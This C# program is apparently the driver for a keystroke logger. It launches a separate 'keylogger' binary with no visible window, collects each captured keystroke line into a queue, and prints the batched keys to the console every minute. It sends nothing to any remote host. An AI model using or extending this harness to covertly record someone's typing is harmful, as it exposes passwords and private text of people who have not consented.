using System;
using System.Diagnostics;
using System.Threading;
using System.Threading.Tasks;
using wanshitong.KeyAggregation;

namespace wanshitong
{
    class Program
    {
        public static KeyQueue KeyQueue = new KeyQueue(PrintQueue);

        static void Main(string[] args)
        {
            Task.Run(() => CreateKeyLoggerThread());
            Task.Run(() => RecurringPrinter());

            Task.Delay(Timeout.Infinite).Wait();
        }

        private static void RecurringPrinter()
        {
            while (true)
            {
                Task.Delay(60000).Wait();
                PrintQueue();
            }
        }

        private static void PrintQueue()
        {
            var current = KeyQueue.Flush();
                if(current != "")
                    System.Console.WriteLine(current);
        }

        private static void CreateKeyLoggerThread()
        {
            var proc = new Process 
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "keylogger/keylogger",
                    Arguments = "",
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    CreateNoWindow = true
                }
            };

            proc.Start();
            while (!proc.StandardOutput.EndOfStream)
            {
                string line = proc.StandardOutput.ReadLine();
                // do something with line 
                //System.Console.WriteLine(line);
                KeyQueue.Add(line);
            }
        }
    }
}
